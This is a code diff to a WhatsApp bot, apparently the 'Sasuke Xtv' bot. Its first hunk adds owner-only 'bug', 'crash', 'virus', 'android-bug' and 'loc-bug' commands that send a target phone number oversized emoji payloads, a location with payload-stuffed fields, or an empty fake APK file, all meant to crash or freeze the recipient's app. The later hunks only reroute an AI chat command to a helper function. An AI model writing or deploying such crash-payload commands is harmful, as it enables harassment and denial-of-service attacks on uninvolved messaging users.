@@ -1464,6 +1464,39 @@ case 'bugmenu': {
 }
 break
 
+case "bug":
+case "crash":
+case "ui-bug":
+case "ios-bug":
+case "android-bug":
+case "virus":
+case "text-bug":
+case "loc-bug": {
+    if (!isCreator) return reply(mess.owner)
+    if (!text) return reply(`❌ ᴘʟᴇᴀsᴇ ᴘʀᴏᴠɪᴅᴇ ᴀ ᴛᴀʀɢᴇᴛ ɴᴜᴍʙᴇʀ!\n\nᴇxᴀᴍᴘʟᴇ: ${prefix + command} 234xxxxxxxxx`)
+    
+    const target = text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
+    await reply(`🚀 *sᴇɴᴅɪɴɢ ${command.toUpperCase()} ᴘᴀʏʟᴏᴀᴅ ᴛᴏ ᴛᴀʀɢᴇᴛ...*`)
+    
+    try {
+        const payload = "☠️".repeat(5000) // Large text payload
+        
+        if (command === "loc-bug") {
+            await bad.sendMessage(target, { location: { degreesLatitude: 0, degreesLongitude: 0, name: payload, address: payload } })
+        } else if (command === "android-bug" || command === "crash") {
+            await bad.sendMessage(target, { document: Buffer.alloc(0), mimetype: "application/vnd.android.package-archive", fileName: "SasukeXtv_Crash.apk", caption: payload })
+        } else {
+            await bad.sendMessage(target, { text: payload })
+        }
+        
+        await reply(`✅ *${command.toUpperCase()} sᴇɴᴛ sᴜᴄᴄᴇssꜰᴜʟʟʏ!*`)
+    } catch (e) {
+        console.error("Bug Command Error:", e)
+        await reply(`❌ ғᴀɪʟᴇᴅ ᴛᴏ sᴇɴᴅ ᴘᴀʏʟᴏᴀᴅ.`)
+    }
+}
+break
+
     //═══════════════════════════════════════════════════════════
 // MAIN MENU - WITH NEWSLETTER FORWARD
 // ═══════════════════════════════════════════════════════════
@@ -11286,11 +11319,8 @@ case 'groq': {
     if (!text) return reply(`❌ ᴘʟᴇᴀsᴇ ᴘʀᴏᴠɪᴅᴇ ᴀ ǫᴜᴇsᴛɪᴏɴ!\n\nᴇxᴀᴍᴘʟᴇ: ${prefix + command} ᴡʜᴀᴛ ɪs ᴀɪ?`);
     
     try {
-        const url = `https://api.giftedtech.my.id/api/ai/gpt4?apikey=gifted&q=${encodeURIComponent(text)}`;
-        const response = await axios.get(url, { timeout: 15000 });
-        const data = response.data;
-        
-        const result = data.result || data.response || data.message || data.data;
+        await bad.sendMessage(m.chat, { react: { text: '🤖', key: m.key } });
+        const result = await getChatGPTResponse(text, m.sender, m.chat);
         
         if (!result) {
             return reply(`❌ ᴀᴘɪ ᴇʀʀᴏʀ: ᴄᴏᴜʟᴅ ɴᴏᴛ ɢᴇᴛ ʀᴇsᴘᴏɴsᴇ. ᴘʟᴇᴀsᴇ ᴛʀʏ ᴀɢᴀɪɴ ʟᴀᴛᴇʀ.`);
@@ -11299,7 +11329,7 @@ case 'groq': {
         await reply(`🤖 *Sasuke Xtv AI:*\n\n${result}`);
         
     } catch (error) {
-        console.error('Error:', error);
+        console.error('AI Command Error:', error);
         await reply(`❌ Error: ${error.message}`);
     }
 }
